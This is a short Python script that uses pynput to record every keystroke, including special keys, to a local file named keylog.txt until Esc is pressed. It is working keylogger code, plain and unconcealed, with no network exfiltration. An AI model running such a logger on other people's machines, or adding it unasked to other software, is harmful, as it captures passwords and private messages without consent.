from pynput import keyboard

# Define a function to handle key press events
def on_press(key):
    try:
        # Log the key press with the actual character
        with open("keylog.txt", "a") as log_file:
            log_file.write(key.char)
    except AttributeError:
        # Log special keys like space, enter, etc.
        with open("keylog.txt", "a") as log_file:
            log_file.write(f'[{key}]')

# Define a function to handle key release events (optional)
def on_release(key):
    if key == keyboard.Key.esc:
        # Stop listener on pressing the escape key
        return False

# Set up the listene
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()